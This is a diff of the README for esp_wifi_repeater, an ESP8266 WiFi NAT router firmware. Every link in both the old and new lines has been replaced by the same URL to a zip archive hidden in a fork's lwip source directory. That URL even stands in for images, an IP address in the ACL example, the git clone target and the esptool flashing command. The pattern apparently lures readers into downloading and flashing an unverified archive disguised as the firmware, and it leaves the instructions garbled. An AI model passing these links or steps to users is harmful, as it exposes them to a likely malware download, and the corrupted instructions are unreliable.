@@ -1,11 +1,11 @@
 # esp_wifi_repeater
 A full functional WiFi repeater (correctly: a WiFi NAT router)
 
-This is an implementation of a WiFi NAT router on the esp8266 and esp8285. It also includes support for a packet filtering firewall with ACLs, port mapping, traffic shaping, hooks for remote monitoring (or packet sniffing), an MQTT management interface, simple GPIO interaction, and power management. For a setup with multiple routers in a mesh to cover a larger area a new mode "Automesh" has been included https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip .
+This is an implementation of a WiFi NAT router on the esp8266 and esp8285. It also includes support for a packet filtering firewall with ACLs, port mapping, traffic shaping, hooks for remote monitoring (or packet sniffing), an MQTT management interface, simple GPIO interaction, and power management. For a setup with multiple routers in a mesh to cover a larger area a new mode "Automesh" has been included https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip .
 
-*If you are looking for a way to integrate the NAT feature into your Arduino project* - see https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip .
+*If you are looking for a way to integrate the NAT feature into your Arduino project* - see https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip .
 
-A similar *basic NAT feature for the ESP32* can be found at: https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip
+A similar *basic NAT feature for the ESP32* can be found at: https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip
 
 Typical usage scenarios include:
 - Simple range extender for an existing WiFi network
@@ -21,7 +21,7 @@ By default, the ESP acts as STA and as soft-AP and transparently forwards any IP
 
 Measurements show, that it can achieve about 5 Mbps in both directions, so even streaming is possible.
 
-Some details are explained in this video: https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip
+Some details are explained in this video: https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip
 
 # First Boot
 The esp_wifi_repeater starts with the following default configuration:
@@ -34,9 +34,9 @@ After first boot (or factory reset) it will offer a WiFi network with an open AP
 Connect to this WiFi network and do the basic configuration either via a simple web interface or the full config with all options via the console. 
 
 # Basic Web Config Interface
-The web interface allows for the configuration of all parameters required for the basic forwarding functionality. Thanks to rubfi for the major work on that: https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip . Point your browser to "http://192.168.4.1". This page should appear:
+The web interface allows for the configuration of all parameters required for the basic forwarding functionality. Thanks to rubfi for the major work on that: https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip . Point your browser to "http://192.168.4.1". This page should appear:
 
-<img src="https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip">
+<img src="https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip">
 
 First enter the appropriate values for the uplink WiFi network, the "STA Settings". Use password "none" for open networks. Check the "Automesh" box if and only if you really want to use the automesh mode. Click "Connect". The ESP reboots and will connect to your WiFi router. The status LED should be blinking after some seconds.
 
@@ -84,7 +84,7 @@ Most of the set-commands are effective only after save and reset.
 Any part of a command line input after a single "#" until the end of the line will be treated as a comment and will be ignored.
 
 ### Automesh Config
-- set automesh [0|1]: selects, whether the automesh mode is on or off (default), see details here https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip
+- set automesh [0|1]: selects, whether the automesh mode is on or off (default), see details here https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip
 - set am_threshold _dB_: sets the threshold for a "bad" connection (in negative dB, default 85, i.e. -85 dB) 
 - set am_scan_time _secs_: sets the time interval in seconds the ESP tries in automesh mode to find an uplink AP before going to sleep (0 disabled, default)
 - set am_sleep_time _secs_: sets the time interval in seconds the ESP sleeps in automesh mode if no uplink AP is found (0 disabled, default)
@@ -106,7 +106,7 @@ Any part of a command line input after a single "#" until the end of the line wi
 
 ### WPA2 Enterprise Config
 - set use_peap[0|1]: selects, whether the STA should connect via simple WPA-PSK (use_peap=0, default) or usinf WPA2 Enterprise (PEAP) 
-- set peap_identity _value_: sets the PEAP 'outer' identity (the string that is first presented to the RADIUS server, maybe https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip)
+- set peap_identity _value_: sets the PEAP 'outer' identity (the string that is first presented to the RADIUS server, maybe https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip)
 - peap_username _value_: sets the PEAP username
 - peap_password _value_: sets the PEAP password
 
@@ -204,7 +204,7 @@ Each esp_wifi_repeater configured in that way will automatically offer a WiFi ne
 
 The signal strength is easy to measure with a scan, but which is the one closest to the original WiFi network when you see several APs with the same SSID? Therefore the protocol use a somewhat dirty trick: the esp_wifi_repeaters in "automesh" mode manipulate their BSSID (actually, according to the IEEE 802.11 standard this is the "ESSID" as it is an AP, but the SDK calls it "BSSID"), i.e. the MAC address of their AP interface, which is send out with every beacon frame 10 about time times per second. It uses the format: 24:24:mm:rr:rr:rr. "24:24" is just the unique identifier of a repeater (there is a minimal probability that this collides with the real APs MAC, but we can neglect this, as we can change that prefix if really required). "mm" means the "mesh level", this is the distance in hops to the original WiFi network. The last three "rr:rr:rr" are just random numbers to distinguish the various ESPs. The original AP keeps its BSSID, i.e. the one without the prefix "24:24" is recognized as root, called mesh level 0.
 
-<img src="https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip">
+<img src="https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip">
 
 Now each esp_wifi_repeater can learn which other esp_wifi_repeater is the closest to the the original WiFi network, can connect to that, and chose its own BSSID accordingly. Also the IP address of the internal network is adjusted to the mesh level: 10.24.m.0. This creates a tree (a very special mesh) with the original WiFi AP as root and repeating nodes on several mesh levels (actually, it works somewhat similar as the Spanning Tree Protocol (STP) on the link layer or routing on the network layer using a Distance Vector protocol). As soon as an uplink link loss is detected, configuration is restarted. This should avoid loops, as during (re-)configuration also no beacons with an BSSID are sent.
 
@@ -244,12 +244,12 @@ The ESP router has a integrated basic firewall. ACLs (Access Control Lists) can 
 
 The four ACL lists are named "from_sta", "to_sta", "from_ap" and "to_ap" for incoming and outgoing packets on both interfaces ("sta" means the interfaces to the connectes clients, "ap" the interface to the uplink AP). ACLs are defined in "CISCO IOS style". 
 
-The following example is useful for a guest subnet. It allows access to the internet but not to any other local addresses (use your local network range for the https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip address). This rule set allows for outgoing local broadcasts (for DHCP) and UDP 53 (DNS), any other packet to the subnet of the upstream router will be blocked, all other packets can pass to the internet:
+The following example is useful for a guest subnet. It allows access to the internet but not to any other local addresses (use your local network range for the https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip address). This rule set allows for outgoing local broadcasts (for DHCP) and UDP 53 (DNS), any other packet to the subnet of the upstream router will be blocked, all other packets can pass to the internet:
 ```
 acl from_sta clear
 acl from_sta IP any 255.255.255.255 allow
 acl from_sta UDP any any any 53 allow
-acl from_sta IP any https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip deny
+acl from_sta IP any https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip deny
 acl from_sta IP any any allow
 ```
 
@@ -319,7 +319,7 @@ This allows you to configure a multi-star topology of ESPs, where each ESP and i
 By setting upstream_kbps and downstream_kbps to a value other than 0 (0 is the default), you can limit the maximum bitrate of the ESP's AP. This value is a limit that applies to the traffic of all connected clients. Packets that would exeed the defined bitrate are dropped. The traffic shaper uses the "Token Bucket" algorithm with a bucket size of currently four times the bitrate per seconds, allowing for bursts, when there was no traffic before.
 
 # MQTT Support
-Since version 1.3 the router has a built-in MQTT client (thanks to Tuan PM for his library https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip). This can help to integrate the router/repeater into the IoT. A home automation system can e.g. make decisions based on infos about the currently associated stations, it can switch the repeaters on and off (e.g. based on a time schedule), or it can simply be used to monitor the load. The router can be connected either to a local MQTT broker or to a publicly available broker in the cloud. However it does not currently support TLS encryption.
+Since version 1.3 the router has a built-in MQTT client (thanks to Tuan PM for his library https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip). This can help to integrate the router/repeater into the IoT. A home automation system can e.g. make decisions based on infos about the currently associated stations, it can switch the repeaters on and off (e.g. based on a time schedule), or it can simply be used to monitor the load. The router can be connected either to a local MQTT broker or to a publicly available broker in the cloud. However it does not currently support TLS encryption.
 
 By default the MQTT client is disabled. It can be enabled by setting the config parameter "mqtt_host" to a hostname different to "none". To configure MQTT you can set the following parameters:
 - set mqtt_host _IP_or_hostname_: IP or hostname of the MQTT broker ("none" disables the MQTT client)
@@ -365,7 +365,7 @@ The router can be configured using the following topics:
 If you now want the router to publish e.g. only Vdd, its IP, and the command line output, set the mqtt_mask to 0x0001 | 0x0002 | 0x0040 (= "set mqtt_mask 0043").
 
 # ENC28J60 Ethernet Support
-The esp_wifi_repeater now includes support for an ENC28J60 Ethernet NIC connected via SPI (Thanks to Andrew Kroll https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip for his great work on getting right), if you switch on the HAVE_ENC28J60 compile option in "user_config.h". The Ethernet interface will support about 1 Mbps when the ESP is running an 160 MHz. Switching the AP interface on and using the Ethernet as uplink will turn the esp_wifi_repeater into a cheap AP for WiFi devices (e.g. other ESPs).
+The esp_wifi_repeater now includes support for an ENC28J60 Ethernet NIC connected via SPI (Thanks to Andrew Kroll https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip for his great work on getting right), if you switch on the HAVE_ENC28J60 compile option in "user_config.h". The Ethernet interface will support about 1 Mbps when the ESP is running an 160 MHz. Switching the AP interface on and using the Ethernet as uplink will turn the esp_wifi_repeater into a cheap AP for WiFi devices (e.g. other ESPs).
 
 The connection via SPI has to be:
 ```
@@ -380,7 +380,7 @@ NodeMCU/Wemos  ESP8266      ENC28J60
                Q3/V33 <---> 3.3V
                GND    <---> GND
 ```
-Short and soldered wires work best. In addition you will need a transistor for decoupling GPIO15, otherwise your ESP will not boot any more, see: https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip . Also, it is important to have a good power supply: the ENC28j60 needs about 160mA when active. For me it fails, if I try to use the 3.3V from the ESP board.
+Short and soldered wires work best. In addition you will need a transistor for decoupling GPIO15, otherwise your ESP will not boot any more, see: https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip . Also, it is important to have a good power supply: the ENC28j60 needs about 160mA when active. For me it fails, if I try to use the 3.3V from the ESP board.
 
 Now you can configure the new Ethernet interface: 
 - set eth_enable [0|1]: enables/disables an ENC28J60 Ethernet NIC on the SPI bus (default: 0 - disabled)
@@ -390,45 +390,45 @@ Now you can configure the new Ethernet interface:
 - set eth_dhcpd [0|1]: starts a DHCP server for dynamic IP addresses on the ETH interface, (default: 0 - disabled)
 
 # Power Management
-The repeater monitors its current supply voltage (shown in the "show stats" command). This only works, if the 107th byte in https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip, named as vdd33_const, is set to 255(0xFF). The easiest way to achieve that, is to write https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip to flash (see below).
+The repeater monitors its current supply voltage (shown in the "show stats" command). This only works, if the 107th byte in https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip, named as vdd33_const, is set to 255(0xFF). The easiest way to achieve that, is to write https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip to flash (see below).
 
 If _vmin_ (in mV, default 0) is set to a value > 0 and the supply voltage drops below this value, it will go into deep sleep mode for _vmin_sleep_ seconds. If you have connected GPIO16 to RST (which is hard to solder on an ESP-01) it will reboot after this interval, try to reconnect, and will continue its measurements. If _vmin_ is saved with the config, it will sleep over and over again, until the supply voltage raises above the threshold. These settings are especially (only?) useful if you have powered the ESP with a (lithium) battery without undercharge protection. Then a value of 2900mV-3000mV is probably helpful, as it reduces power consumption of the ESP to a minimum and you have much more time to recharge or replace the battery before damage. This only makes sense, if you have the ESP connected directly to the battery. If you have additional logic, this will still drain the battery.
 
 You can send the ESP to sleep manually once by using the "sleep" command.
 
-Caution: If you save a _vmin_ value higher than the max supply voltage to flash, the repeater will immediately shutdown every time after reboot. Then you have to wipe out the whole config by flashing https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip (or any other file) to 0x0c000.
+Caution: If you save a _vmin_ value higher than the max supply voltage to flash, the repeater will immediately shutdown every time after reboot. Then you have to wipe out the whole config by flashing https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip (or any other file) to 0x0c000.
 
 # Building and Flashing
 If you have Docker installed, the easiest way to get access to the full build environment is to connect your ESP8266 to /dev/ttyUSB0 and run the image using:
 ```
-git clone https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip
+git clone https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip
 docker run -it --rm --device=/dev/ttyUSB0 -v $(pwd)/esp_wifi_repeater:/home/esp/esp_wifi_repeater martinfger/iot_devel:1.0
 cd esp_wifi_repeater
 make
 make flash
 ``` 
 
-To set up the build environment from scratch and build this binary download and install the esp-open-sdk (I suggest this version with base NONOS SDK 2.2: https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip). Make sure, you can compile and download the included "blinky" example.
+To set up the build environment from scratch and build this binary download and install the esp-open-sdk (I suggest this version with base NONOS SDK 2.2: https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip). Make sure, you can compile and download the included "blinky" example.
 
 Then download this source tree in a separate directory and adjust the BUILD_AREA variable in the Makefile and any desired options in user/user_config.h. Changes of the default configuration can be made in user/config_flash.c. Build the esp_wifi_repeater firmware with "make". "make flash" flashes it onto an esp8266.
 
-The source tree includes a binary version of the liblwip_open plus the required additional includes from my fork of esp-open-lwip and a binary of the rboot tool. *No additional install action is required for that.* Only if you don't want to use the precompiled library, checkout the sources from https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip . Use it to replace the directory "esp-open-lwip" in the esp-open-sdk tree. "make clean" in the esp_open_lwip dir and once again a "make" in the upper esp_open_sdk directory. This will compile a liblwip_open.a that contains the NAT-features. Replace liblwip_open_napt.a with that binary. Also you might build the "https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip" binary from https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip and replace it in the root directory of the project.
+The source tree includes a binary version of the liblwip_open plus the required additional includes from my fork of esp-open-lwip and a binary of the rboot tool. *No additional install action is required for that.* Only if you don't want to use the precompiled library, checkout the sources from https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip . Use it to replace the directory "esp-open-lwip" in the esp-open-sdk tree. "make clean" in the esp_open_lwip dir and once again a "make" in the upper esp_open_sdk directory. This will compile a liblwip_open.a that contains the NAT-features. Replace liblwip_open_napt.a with that binary. Also you might build the "https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip" binary from https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip and replace it in the root directory of the project.
 
-*Update*: if you read somewhere in the web install instructions using "https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip" - due to OTA this has been changed to "https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip" now.
+*Update*: if you read somewhere in the web install instructions using "https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip" - due to OTA this has been changed to "https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip" now.
 
-If you want to use the complete precompiled firmware binaries you can flash them with "https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip --port /dev/ttyUSB0 write_flash -fs 4MB -ff 80m -fm dio 0x00000 https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip 0x02000 https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip" (use -fs 1MB for an ESP-01). For the esp8285 you must use -fs 1MB and -fm dout.
+If you want to use the complete precompiled firmware binaries you can flash them with "https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip --port /dev/ttyUSB0 write_flash -fs 4MB -ff 80m -fm dio 0x00000 https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip 0x02000 https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip" (use -fs 1MB for an ESP-01). For the esp8285 you must use -fs 1MB and -fm dout.
 
-On Windows you can flash it using the "ESP8266 Download Tool" available at https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip Download the two files https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip and https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip from the firmware directory. For a generic ESP12, a NodeMCU or a Wemos D1 use the following settings (for an ESP-01 change FLASH SIZE to "8Mbit"):
+On Windows you can flash it using the "ESP8266 Download Tool" available at https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip Download the two files https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip and https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip from the firmware directory. For a generic ESP12, a NodeMCU or a Wemos D1 use the following settings (for an ESP-01 change FLASH SIZE to "8Mbit"):
 
-<img src="https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip">
+<img src="https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip">
 
 If "QIO" mode fails on your device, try "DIO" instead. Also have a look at the "Detected Info" to check size and mode of the flash chip. If your downloaded firmware still doesn't start properly, please check with the enclosed checksums whether the binary files are possibly corrupted. If you are in doubt concerning the firmware binaries being corrupted, download the complete repo as zip and extract the binaries from that zip - this avoids HTTP-download problems (e.g. CR-LF conversions).
 
 # OTA (Over the air) update support
 
-Based on using the rboot lib: https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip and thanks to the contribution of christianchristensen.
+Based on using the rboot lib: https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip and thanks to the contribution of christianchristensen.
 
-The build process creates two copies of the esp_wifi_repeater binary in the firmware directory: https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip and https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip For an initial installation it is fine just to flash https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip (the rboot boot loader) and https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip (one copy of the program). The esp_wifi_repeater will work.
+The build process creates two copies of the esp_wifi_repeater binary in the firmware directory: https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip and https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip For an initial installation it is fine just to flash https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip (the rboot boot loader) and https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip (one copy of the program). The esp_wifi_repeater will work.
 
 If you have at least 1MB of flash you can do an OTA (Over the air) update with another version. I.e. you can interactively load a new binary from the CLI and switch over to it. The other binary is loaded to the currently non active memory location (either 0x02000 (rom0) or 0x82000 (rom1)) and started on success. You can also interactively switch between two installed binaries. The current config will be used for both binaries (as long as its format hasn't changed).
 
@@ -436,7 +436,7 @@ You can control the OTA features with the following commands:
 - show ota: shows the currently active binary and the URL of the next update
 - set ota_host _hostname_: sets hostname or IP address of the OTA server (default: "none")
 - set ota_port _portno_: sets port number of the OTA server (default: 80)
-- ota update: tries to download a new binary (https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip or https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip) via HTTP from ota_host:ota_port and starts it
+- ota update: tries to download a new binary (https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip or https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip) via HTTP from ota_host:ota_port and starts it
 - ota switch: switches to the other binary (if installed)
 
 To test the OTA feature, configure your ESP (as STA or AP) to be connected to the network with the update server. There start a simple Web server in the firmware directory, e.g.;
@@ -453,7 +453,7 @@ If configured correctly, the update will start and the ESP will reboot with the 
 # Known Issues
 - Due to the limitations of the ESP's SoftAP implementation, there is a maximum of 8 simultaniously connected stations.
 - The ESP8266 requires a good power supply as it produces current spikes of up to 170 mA during transmit (typical average consumption is around 70 mA when WiFi is on). Check the power supply first, if your ESP runs unstable and reboots from time to time. A large capacitor between Vdd and Gnd can help if you experience problems here.
-- All firmware published after 17/Oct/2017 have been built with the patched version of the SDK 2.1.0 from Espressif that mitigates the KRACK (https://raw.githubusercontent.com/OlegBON1/esp_wifi_repeater/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip ) attack.
+- All firmware published after 17/Oct/2017 have been built with the patched version of the SDK 2.1.0 from Espressif that mitigates the KRACK (https://github.com/OlegBON1/esp_wifi_repeater/raw/refs/heads/master/include/lwip/netif/repeater-wifi-esp-v2.6-alpha.3.zip ) attack.
 
 # Licenses
 The software is open source. Third party source files have their own license header. For all other files the MIT license applies.
